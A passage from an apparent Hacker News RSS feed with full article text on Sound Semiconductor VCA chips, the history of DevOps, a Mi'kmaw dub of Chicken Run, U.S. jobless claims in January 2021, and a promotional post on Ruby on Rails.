                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2162datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL10.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2164</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2164chip.jpg"></p><p>The FatKeys™ SSI2164 is perhaps the most flexible VCA available, with four independent channels for lowest cost-per-VCA. The user-selectable mode control allows Class A, AB, or intermediate biasing, and current inputs and outputs provide great design freedom. Ideal for voltage-controlled filters.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2164datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
            </div></div>]]>
            </description>
            <link>http://www.soundsemiconductor.com/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778717</guid>
            <pubDate>Thu, 14 Jan 2021 16:55:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The evolution into DevOps and why it works today]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778328">thread link</a>) | @gunnerAK
<br/>
January 14, 2021 | https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today | <a href="https://web.archive.org/web/*/https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Over the last several years and during my time at Atlassian, I’ve been lucky enough to learn from hundreds of engineering teams about their current development practices, their origins, and where they strive to be from an engineering perspective.&nbsp;</p><p>Culturally, one of the most common themes for each organization was moving towards some form of a DevOps model. I also noticed that the majority of organizations I spoke to were on a slightly different journey or maturity level in terms of how they’d adopted or planned to adopt DevOps. A lot of where they were today was based on the roots of where they started off as an organization. For that reason, it’s important we know a little bit about the history of how we’ve made it to our cloud-native world as it is today.&nbsp;</p><p>We can define the evolution of the internet over the past few decades as three different “acts”. Act one, two, and three. Within each act there’s a gradual evolution of the internet and how engineering teams operated their applications during each one of them.&nbsp;<strong>‍</strong></p><h4><strong>Act 1: Early to mid 90s and the rise of dot com&nbsp;</strong></h4><p>‍</p><p><strong>A quick history:&nbsp;</strong><br></p><p>This was the early years of the internet where available bandwidth was still lacking, and the complexity of software increased at a rate faster than the ability of hardware to handle it. It was critical for businesses to figure out a way to get apps on multiple PCs without filling up too much space, while also providing the ability to access from anywhere. The best way to do that was to host the data on someone else's computer, or what was then called a Data Center.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>America Online (AOL)&nbsp;<br></p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e395cf1b9d84db3da56_ApLCwUOIagCmUTUDXIQfIsqeqBT5OnmO2Kz-QO5PN4T0KlBdoZjYZcIpUHxUIjpi58dUDLmyOw2OyNrW1SjAi_Miv02YFTfn8tkghYy3v3iHGTCugcz2YJWUiOOBQAfJQJUWUzQH.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Engineering cycles were extremely long as there were still three siloed roles which consisted of development, operations, and QA in order to move applications through the software development lifecycle and into production. Every single one of these applications were deployed into a dedicated data center which would be monitored by operations teams who were familiar with the systems if anything went wrong.&nbsp;<br></p><h4><strong>Act 2: Late 90s, early 2000s and the rise of internet hyper-growth superstars&nbsp;</strong><br></h4><p>‍</p><p><strong>A quick history:&nbsp;</strong></p><p>With Salesforce.com, Amazon, and Google leading the way, the internet and SaaS started becoming a bit more mainstream and new business models began emerging. These faster moving, hyper-growth companies started adopting hints of what we see in today's modern DevOps and agile development practices.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>Amazon, Google, &amp; Salesforce.com&nbsp;</p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e39f9b70cd79a632237_NfQnOJ-5BsRD-H3x28P0flYVHdnpdrK8WzHrhKcBkcsGw_5o7I5Age043Ri0ZKozBgsJ9aZZ9cI41E4d9Fs8fHeirJzIwHSAUnlj6-oLhHS94qWaDwvQc63lVdr-whsWole0i_KV.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Applications were still deployed and monitored in their own very large data centers, although because of the massive scale and growth of some of these companies, it made sense to build out a central infrastructure team that could manage common issues dependent on any services. This is also when Site Reliability Engineer and Systems Engineer roles were eventually born.&nbsp;<br></p><h4><strong>Act 3: The 2010s, beginnings of cloud-native, and high-availability cloud</strong><br></h4><p>‍</p><p><strong>A quick history:</strong>&nbsp;</p><p>During this era, internet and SaaS applications are developed on top of one of the big three public cloud providers: AWS, GCP, or Azure. The emergence of cloud-native in this era also came with more competition, so building faster, scalable, and resilient applications that contributed directly to business growth was key. Also for many of these organizations, the introduction of Kubernetes would create huge efficiency gains like reclaiming any unused capacity during off-peak hours and reducing build times.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>Airbnb, Box, Pinterest&nbsp;</p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e3af711dc73a4a0cda4_aKhuOhookGB842E7yMFRgIvc1HrJyV0Ev2T49W0B1UxVqhtgVRa499CifCBcuf1zn4yreok1jafe-0fTNac9Srqw67Vj5AJesB9BhhGKx9bGxRdMGf87XP5Ysc087mTjJ9r_4pFw.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Software iterations happen at lightning speeds, and getting product in the hands of customers as fast as possible is the priority. The technology that comes out of the box from the big three public cloud providers allows for much more flexibility and freedom for the organizations born during this ‘act’. Act 3 marked the transition away from dedicated operations teams focused solely on making sure infrastructure was still running services, especially earlier on in the company's growth stages. Now, resources can be poured into engineers who can handle both development and operations -- leading to what we now call a “You build it, you run it” model.&nbsp;<br></p><h4><strong>Why DevOps works today and what to keep in mind&nbsp;</strong><br></h4><p>The big three public cloud providers have not only lowered barriers for start-ups, but they’ve also provided an amazing foundational infrastructure for any size company to build on. It’s really helped tear down the walls between development and operations, because with it your infrastructure starts to look a lot like software too. Engineers can much more easily understand the API driven nature, and their infrastructure starts to look a lot like code -- which is exactly what they’re used to.&nbsp;<br></p><p>Now that engineers are even closer to what’s going on in their infrastructure, operations more naturally comes as part of the day-to-day. Most of the rudimentary operational tasks we’ve experienced in Act 1 &amp; 2 have been automated to a point where now you can both own it, all while shipping product faster. While some may think that the move to cloud-native will make the traditional operations engineer obsolete, this couldn’t be further from the truth. Even with all the latest advancements in infrastructure, the engineers who focus on operations and reliability still have critical roles and skill sets needed during different stages of a scaling organization.&nbsp;<br></p><p>All in all, if you’re wondering what’s the right model for your organization -- the answer is it really depends. Depending on the size, scale, growth or what makes sense for the engineering organization some may go the way of the site reliability or systems engineering model. For many companies, the right way might be a pure DevOps, “you build it, you run it” model built on the public cloud, taking into account the number of engineers, reliability/SLO’s required, and how fast the team needs to iterate and ship code.&nbsp;<br></p><p>What doesn’t change though is the need to ship code as fast, confidently, and reliably as possible. Whichever model you choose the dynamics and ecosystem for engineering teams is becoming extremely complex. All the moving pieces around your infrastructure, services, metadata, components, ownership, teams, deploys, on-call schedules, incidents etc. occupies a level of mindshare in the back of every engineer’s head. We need to set that free. effx helps the world’s best engineering teams do that -- <a href="https://www.effx.com/"><strong>you should take it for a spin here for free.</strong></a><strong>&nbsp;</strong></p></div></div></div>]]>
            </description>
            <link>https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778328</guid>
            <pubDate>Thu, 14 Jan 2021 16:30:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Chicken Run became a cult classic in the Mi'kmaw language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778299">thread link</a>) | @empressplay
<br/>
January 14, 2021 | https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A British animated film&nbsp;from 2000 about a hen and rooster's daring escape from a chicken farm has become an unlikely tool for promoting the Mi'kmaw language, thanks to the Johnson family in Eskasoni, N.S.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5871797.1610567119!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/carol-anne-and-tom-johnson.jpg"></p></div><figcaption>Carol Anne and Tom Johnson in Eskasoni, N.S., still get requests from people who want a copy of their overdubbed version of Chicken Run.<!-- --> <!-- -->(Holly Conners/CBC)</figcaption></figure><p><span><p>A British animated film&nbsp;about a hen and rooster's daring escape from a chicken farm has become an unlikely tool for promoting the Mi'kmaw language in Nova Scotia and beyond.</p>  <p>Tom and Carol Anne Johnson from Eskasoni, N.S., along with some of their&nbsp;relatives, overdubbed the 2000 movie <em>Chicken Run</em> in Mi'kmaw about a decade ago. Since then, it's become a cult classic,&nbsp;and they&nbsp;still get&nbsp;requests from people who want to watch it.</p>  <p>"Some people are just hearing it for the first time and they're looking for copies," Carol Anne Johnson told CBC Radio's <em>Mainstreet</em>. "It's all over Cape Breton and the mainland and whoever wants to hear their language really appreciates it, especially if they're away from home."</p>  <p>The family has passed out many copies on&nbsp;DVD&nbsp;over the years, and even heard of kids watching it so many times they wore out their copies.</p>  <p>"Parents were coming up to us and saying, 'You know, my child is speaking Mi'kmaw ... They're watching<em> Chicken Run</em> all day. They're watching it on repeat and they're starting to speak Mi'kmaw,'" said Tom Johnson.</p>  <p><em><strong>LISTEN | Carol Anne and Tom Johnson explain their overdub of Chicken Run:</strong></em></p>  <p><span><span><div><div role="button" tabindex="0" title="Eskasoni family overdubs Chicken Run in Mi'kmaw"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/48/947/InfoMorn_CapeBreton_640x360.jpg" alt=""></p><p><span>Information Morning - Cape Breton</span><span>8:12</span><span>Eskasoni family overdubs Chicken Run in Mi'kmaw</span></p></div></div></div><span>Remember the kids movie Chicken Run?  We look into a particularly Cape Breton phenomenon: Chicken Run, overdubbed in Mi'kmaw.  Reporter Holly Conners spoke to Tom and Carol Anne Johnson about how their family overdubbed the blockbuster to expose young people in Eskasoni, and beyond, to the Mi'kmaq language.<!-- --> <!-- -->8:12</span></span></span></p>  <p>Tom voices one of the main characters, a rooster named Rocky,&nbsp;who falls in love with Ginger&nbsp;the hen, voiced by Carol Anne.&nbsp;</p>  <p>Carol Anne said that people will often remark on their voices when they see the couple on the street.</p>  <p>"People stop us and say, 'Oh my God&nbsp; .... all I can hear is Rocky,'" Carol Anne laughed. "And of course, [Tom will] stop and he'll do his Rocky voice."</p>    <h2>Preserving a language</h2>  <p>Tom grew up speaking Mi'kmaw&nbsp;and he worries about&nbsp;the future of the language. He said the number of speakers in Eskasoni alone has dropped drastically since the 1980s.</p>  <p>Still, he said there's a lot of work being done to try to keep the oral language alive. He points to the efforts of staff at the Eskasoni&nbsp;Immersion School and a&nbsp;YouTube channel he created&nbsp;<a href="https://www.youtube.com/user/MikmaqMusic/featured" target="_blank">to share Mi'kmaw music.</a></p>  <p>"This was something that was never seen before," Tom&nbsp;said.&nbsp;"You have these animated characters speaking the language and it sparked interest amongst the younger generation."&nbsp;</p>  <p>Carol Anne said the family reached out to Dreamworks, the studio that owns the rights to the film,&nbsp;asking for permission several years ago, but they never heard back. She figures that's a good sign.</p>  <p><em><strong>WATCH | A scene in Chicken Run overdubbed in Mi'kmaw:</strong></em></p>  <p><span><span><div><div title="A scene from Chicken Run overdubbed in Mi'kmaw" role="button" tabindex="0"><div><div aria-labelledby="1843854915504-metadata-" title="A scene from Chicken Run overdubbed in Mi'kmaw"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/230/78/chicken_run.png" alt="" loading="lazy"></p></div></div></div></div></div></span></span></p>  <p>The family's foray into voice acting began&nbsp;as a way to bring joy to Tom&nbsp;and Carol Anne's&nbsp;son, also named&nbsp;Tom,&nbsp;many years ago. He was about four years old when his twin sister died.&nbsp;</p>  <p>Tom Sr.'s brother decided to get the family together to overdub&nbsp;<em>Gordy</em>, a&nbsp;1995 Disney movie about a pig,&nbsp;in Mi'kmaw.</p>  <p>"He wanted [his nephew]&nbsp;to be able to see a movie in his language, because at the age of four, for the most part, he spoke Mi'kmaw," Carol Anne said. "And he thought it was very funny to see all these animals speaking Mi'kmaw."</p>  <p>Tom's brother suggested the family's next project should be <em>Chicken Run, </em>and the&nbsp;idea took on a life of its own after that.</p>  <h2>Project took 6 weeks</h2>  <p>Tom and Carol Anne began&nbsp;spending up to eight hours every night around a microphone in their garage, which&nbsp;was also a recording studio. The entire project took about six weeks.&nbsp;</p>  <p>"Once we started, we couldn't stop," said Carol Anne. "We even asked some of our children to come in, make some cameos. We had my niece in there&nbsp;as well."</p>    <p>It was tedious and time-consuming work&nbsp;to match up the syllables in Mi'kmaw with the&nbsp;movement of the characters' mouths, but Tom said it was fun, too.&nbsp;</p>  <p>"We got a big kick out of seeing cartoons speaking Mi'kmaw, and we couldn't stop laughing," he said. "We said, 'Wow, this would be fun for our people.'"</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>We got a big kick out of seeing cartoons speaking Mi'kmaw, and we couldn't stop laughing.<svg focusable="false" x="0px" y="0px" width="23px" height="22px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g display="none"><g display="inline"><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g><g><path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg></span><cite>- Tom Johnson, Eskasoni</cite></span></blockquote>    <p>In the end,&nbsp;their overdubbed version is&nbsp;not a literal translation, but tries&nbsp;to capture the essence of what the characters said while also throwing in humour and references that Mi'kmaw speakers would enjoy.</p>  <p>In&nbsp;a couple of scenes, you can hear Mi'kmaw music in the background, including from Tom's band, The Relatives.&nbsp;</p>  <p>"That's why it was so successful, because everything in there is very relatable," Carol Anne said.&nbsp;</p>  <h2>'We need more stuff like this'</h2>  <p>Starr&nbsp;Paul, a Mi'kmaw language educator from Eskasoni, remembers watching the film for the first time during a viewing at the high school.</p>  <p>"I was taken aback. I was like, 'Oh my god,&nbsp;that's so awesome.&nbsp;We need more stuff like this,'" she said.&nbsp;&nbsp;</p>  <p><em><strong>WATCH | A look inside a Mi'kmaw Immersion School in Nova Scotia:</strong></em></p>  <p><span><span><div><div title="Visit this Mi'kmaq immersion school in Nova Scotia" role="button" tabindex="0"><div><div aria-labelledby="1186888771957-metadata-" title="Visit this Mi'kmaq immersion school in Nova Scotia"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/386/347/Beyond94_ESK_Thumb.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>Eskasoni, N.S., is taking steps to preserve its Indigenous language among the next generation<!-- --> <!-- -->10:50</span></span></span></p>  <p>Paul brought a copy of the Johnsons' version of&nbsp;<em>Chicken Run</em>&nbsp;to her in-laws in New Brunswick, who loved it. She said social media has made sure its legacy lives on.</p>  <p>"Sometimes you hear people say, 'Anybody&nbsp;have a copy of Mi'kmaw <em>Chicken Run?'&nbsp;</em>So it wasn't just throughout Eskasoni — it was throughout everywhere. It was a huge hit," she said.</p>  <p>Paul has&nbsp;been teaching Mi'kmaw&nbsp;immersion for more than 20 years and said in the early days, educators had to create most of their own teaching materials.</p>  <p>"We had to translate stuff. We had to transcribe and we had all these different methods of trying to put down the words for [the students] to learn," she said.</p>  <p>These days, technology has made some of that work&nbsp;easier, but Paul wishes there were more resources like Mi'kmaw <em>Chicken Run</em>.</p>  <p>She's&nbsp;eager for Tom and Carol Anne to overdub another movie, but they're not sure they're ready to put in that kind of time and effort again.</p>  <p>"It almost became like a labour of love, really, and we're not quitters, so we wanted to see it to the end," said Carol Anne.&nbsp;"We're just honoured that it was shared like that, so it became bigger than us, that's for sure."</p>  </span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778299</guid>
            <pubDate>Thu, 14 Jan 2021 16:29:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. jobless numbers surge as worsening Covid-19 pandemic hurts businesses]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 92 (<a href="https://news.ycombinator.com/item?id=25778289">thread link</a>) | @heyheyheysome
<br/>
January 14, 2021 | https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5872837.1610635730!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/usa-smallbusiness-ppp.JPG"></p></div><figcaption>A woman walks past a business that is closing in New York City in August. Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday.<!-- --> <!-- -->(Carlo Allegri/Reuters)</figcaption></figure><p><span><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p>  <p>Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday. Economists polled by Reuters had forecast 795,000 applications in the latest week.</p>  <p>It's the highest number since late August.&nbsp;Applications declined over the summer but have been stuck above 700,000 since September.</p>  <p>Claims were also likely lifted by re-applications for benefits following the government's renewal of a $300 US unemployment supplement until March 14 as part of nearly $900 billion in additional relief approved at the end of December.</p>    <p>Government-funded programs for the self-employed, gig workers and others who do not qualify for the state unemployment programs as well as those who have exhausted their benefits were also extended.</p>  <p>Authorities in many states have banned indoor dining to slow the spread of the coronavirus. The economy shed jobs in December for the first time in eight months.</p>  <p>The Federal Reserve's Beige Book report of anecdotal information on business activity collected from contacts nationwide in early January showed on Wednesday that "contacts in the leisure and hospitality sectors reported renewed employment cuts due to stricter containment measures."</p>  <p>The central bank also noted that the resurgence in the coronavirus was causing staff shortages in the manufacturing, construction and transportation&nbsp;sectors.</p>  <h2>Most infections of any country</h2>  <p>The virus has infected more than 22.5 million people in the United States and killed over 376,188, the most of any country.&nbsp;More than 4,300 deaths were reported Tuesday, a&nbsp;record high.</p>  <p>Though jobless claims have dropped from a record 6.867 million in March, they remain above their 665,000 peak during the 2007-09 Great Recession. Economists say it could take several years for the labour market to recover from the pandemic.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/health-coronavirus-usa-florida.JPG 300w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/health-coronavirus-usa-florida.JPG 460w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/health-coronavirus-usa-florida.JPG 620w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG 780w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/health-coronavirus-usa-florida.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG"></p></div><figcaption>Hundreds wait in line to receive the COVID-19 vaccine in Fort Myers, Fla., in late December. Economists are hopeful the economy will turn around in late 2021.<!-- --> <!-- -->(Andrew West/The News-Press/USA Today Network/Reuters)</figcaption></figure></span></p>  <p>"While prospects for the economy later in 2021 are upbeat, the labour market recovery has taken a step backward," said Nancy Vanden Houten, an economist at Oxford Economics, "and we expect claims to remain elevated, with the risk that they rise from last week's levels."</p>  <p>Last week's applications for aid might have been elevated in part because state employment offices had been closed over the holidays, requiring some jobless people to wait until last week to apply.&nbsp;</p>  <h2>5.3 million Americans receiving jobless benefits</h2>  <p>In addition to last week's first-time applications for unemployment aid, the government said Thursday that 5.3 million Americans are continuing to receive state jobless benefits, up from 5.1 million in the previous week. It suggests that fewer people who are out of work are finding jobs.</p>  <p>About 11.6 million people received jobless aid from two federal programs in the week that ended Dec. 26, the latest period for which data is available. One of those programs provides extended benefits to people who have exhausted their state aid. The other supplies benefits to self-employed and contract workers.</p>  <p>Those two programs had expired near the end of December. They were belatedly renewed, through mid-March, in the $900-billion rescue aid package that Congress approved and President Donald Trump signed into law. That legislation also included $600 relief cheques&nbsp;for most adults and a supplemental unemployment benefit payment of $300 a week. Congressional Democrats favour boosting the cheques&nbsp;to $2,000 and extending federal aid beyond March, as does president-elect Joe Biden.</p>    <p>The U.S. job market's weakness was made painfully clear in the December employment report that the government issued last week. Employers shed jobs for the first time since April as the pandemic tightened its grip on consumers and businesses.</p>  <p>The figures also depicted a sharply uneven job market: The losses last month were concentrated among restaurants, bars, hotels and entertainment venues. Educational services, mostly colleges and universities, also cut workers in December. So did film and music studios.</p>  <p>Most other large industries, though, reported job gains. Many economists had expected last spring that job losses would spread to more industries. Though all sectors of the economy initially laid off workers, most of them have avoided deep job cuts. Manufacturing, construction, and professional services like engineering and architecture, for example, all added jobs in December.</p>  <p>At the same time, many companies seem reluctant to sharply ramp up hiring. A government report Tuesday showed that employers advertised fewer open jobs in November than in October. The decline, while small, was widespread across most industries.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778289</guid>
            <pubDate>Thu, 14 Jan 2021 16:28:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is RoR Dead?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778256">thread link</a>) | @Damix
<br/>
January 14, 2021 | https://themasters.io/blog/posts/is-ruby-on-rails-already-dead | <a href="https://web.archive.org/web/*/https://themasters.io/blog/posts/is-ruby-on-rails-already-dead">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span>On the other hand, just think about how much has changed in technology in the last six years - how is it even possible that a technology which was reported as dead in the water around 2013 is still being written about in 2021? <strong>Is RoR in fact dead, or is it an Internet myth?</strong></span></p>
<p><span>If you're a business owner looking to improve your existing Ruby on Rails app, or if you're looking to build a web app from scratch, it's all very confusing. Here's what you really need to know about Ruby on Rails app development in the real world.</span></p>
<h3><strong>Which well-known companies use Ruby on Rails for big projects?</strong></h3>
<p><strong><img src="https://themasters.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbVlFIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5cd3ce3180244c8adb5f0490d6e04f86d2074b76/ruby-on-rails-framework.jpg" alt="Ruby on rails framework" width="500" height="262"></strong></p>
<h4>
<span><strong>Basecamp</strong> <strong>â€“ software for project management/team communications</strong><br></span><span>In fact, Ruby on Rails was born at Basecamp, because they took an existing web application, and extracted the best parts to create the ultimate MVC framework. And right now Basecamp runs on half a dozen platforms, including native mobile apps, with RoR still acting as their preferred backend.</span>
</h4>
<h4>
<strong>GitHub â€“ the biggest code repository in the worldÂ&nbsp;<br></strong><span>On a side-note, RoR includes several features designed specifically to improve application performance. One such feature, Turbolinks, descends from an approach called pjax, which was actually developed at GitHub.</span>
</h4>
<p><strong>And the list of other well-known companies using RoR continues with:<br></strong></p>
<ul>
<li><span><strong>AirBnB</strong> - they've been using Ruby on Rails since they first started up,</span></li>
<li><span><strong>Crunchbase</strong> - tells you who stands behind innovative companies,</span></li>
<li><span><strong>Dribbble</strong> - a showcase for the world's top design professionals,</span></li>
<li><span><strong>Groupon</strong> - ecommerce marketplace providing special offers and discounts on products and services</span></li>
<li><span><strong>Kickstarter</strong> - crowdsourcing service,</span></li>
<li><span><strong>Pixlr</strong> - photo editing web application,</span></li>
<li><span><strong>Shopify</strong> - huge ecommerce software platform, and</span></li>
<li><span><strong>SlideShare</strong> - hosting service for professional content.</span></li>
</ul>
<p>Just by looking at the short list of use-cases above, you can see that many, quite different types of web applications are run on RoR.</p>
<h3><strong>How about performance?</strong></h3>
<p><span>As you can see from the list above of <strong>big companies using RoR</strong>, experienced RoR developers can already maximise performance by leveraging:<br></span></p>
<ul>
<li><span>the asset pipeline, which uses several strategies to reduce the number of requests the web browser makes for assets,</span></li>
<li><span>Turbolinks, which maintain a permanent process (just like single-page applications do), so that CSS and JavaScript don't need to be reinitialized and reapplied to the page again,</span></li>
<li><span>techniques to reduce the number of database queries your application makes and improve the performance of slow queries, and</span></li>
<li><span>storing frequently used data so that further requests for the same data will be faster (low-level caching and fragment caching).</span></li>
</ul>
<p><span>How about the performance of the Ruby language itself? Ruby's inventor, Yukihiro â€œMatzâ€� Matsumoto, has stated his clear intention to make Ruby 3.0 three times faster than Ruby 2.0. He aims to achieve this by improving both memory performance and CPU performance. </span></p>
<p><img title="Ruby on Rails app development" src="https://themasters.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBbVVFIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--b2c31ec958710b208fb1b697ab5fdac13895f74f/ruby-on-rails-developer.jpg" alt="senior programmer working on ruby on rails code" width="600" height="400"></p>
<h3><strong>Why do programmers like RoR?</strong></h3>
<p><span>RoR is an integrated system that collapses as many unnecessary conceptual models as possible using principles like Don't Repeat Yourself (DRY), convention-over-configuration, and English-like semantics. In turn, this leads to simplicity and clarity, which translates to progress at speed.<strong> In short, this allows a programmer to write code that not only makes her smile while she writes it, but also makes a different programmer smile when he later has to extend or patch it.</strong></span></p>
<p><span>From a business perspective, it really isn't a good idea to use a programming language which is the next cool thing on the block. Nope, you'll want to invest in a complete ecosystem which is mature, stable, predictable, reliable, and scales well . Whilst RoR is mature technology it is not stagnant, but it is rather constantly evolving, and that is thanks to all those who actively contribute to its great community. The chances are that, if developers get stuck at any time when developing a particular functionality, there is a ready-to-use gem for it in the massive library of Ruby gems.</span></p>
<h3><strong>Why do businesses like RoR?</strong></h3>
<p><span>With RoR, skilful, experienced developers are more productive, that is, they can do <strong>more, faster, and more cost-effectively.</strong> This also means that both the business team and the developers can focus together on business features and complex application logic. In reality, this means that you can fully focus on creating a web app which encapsulates whatever differentiates your business from other businesses.</span></p>
